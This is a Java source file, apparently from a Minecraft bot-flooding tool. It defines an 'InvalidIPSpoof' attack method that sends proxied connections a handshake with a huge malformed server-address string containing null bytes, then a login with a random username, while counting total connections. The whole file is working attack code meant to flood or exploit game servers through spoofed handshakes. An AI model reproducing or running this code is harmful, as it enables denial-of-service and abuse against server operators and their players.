package ml.dima_dencep.bettermcbot.methods;

import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import java.io.IOException;
import java.security.SecureRandom;
import java.util.Random;

import ml.dima_dencep.bettermcbot.minecraftutils.Handshake;
import ml.dima_dencep.bettermcbot.minecraftutils.LoginRequest;
import ml.dima_dencep.bettermcbot.Main;
import ml.dima_dencep.bettermcbot.NettyBootstrap;
import ml.dima_dencep.bettermcbot.ProxyLoader;

public class InvalidIPSpoof implements Method {
   private SecureRandom r = new SecureRandom();
   private String lol = "";
   private int a = 14;

   public InvalidIPSpoof() {
      for(int i = 1; i < this.a + 1; ++i) {
         this.lol = String.valueOf(this.lol) + String.valueOf((char)(this.r.nextInt(125) + 1));
      }

   }

   private String randomString(int len) {
      int leftLimit = 97;
      int rightLimit = 122;
      int targetStringLength = len;
      Random random = new Random();
      StringBuilder buffer = new StringBuilder(len);

      for(int i = 0; i < targetStringLength; ++i) {
         int randomLimitedInt = leftLimit + (int)(random.nextFloat() * (float)(rightLimit - leftLimit + 1));
         buffer.append((char)randomLimitedInt);
      }

      return buffer.toString();
   }

   public static void writeVarInt(ByteBufOutputStream out, int paramInt) throws IOException {
      while((paramInt & -128) != 0) {
         out.writeByte(paramInt & 127 | 128);
         paramInt >>>= 7;
      }

      out.writeByte(paramInt);
   }

   public void accept(Channel channel, ProxyLoader.Proxy proxy) {
      channel.writeAndFlush(Unpooled.buffer().writeBytes((new Handshake(Main.protcolID, "1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1......\u0000.\u0000f84c6a790a4e45e0879bcd49ebd4c4e2", Main.port, 2)).getWrappedPacket()));
      channel.writeAndFlush(Unpooled.buffer().writeBytes((new LoginRequest(this.randomString(14))).getWrappedPacket()));
      ++NettyBootstrap.integer;
      ++NettyBootstrap.totalConnections;
   }
}
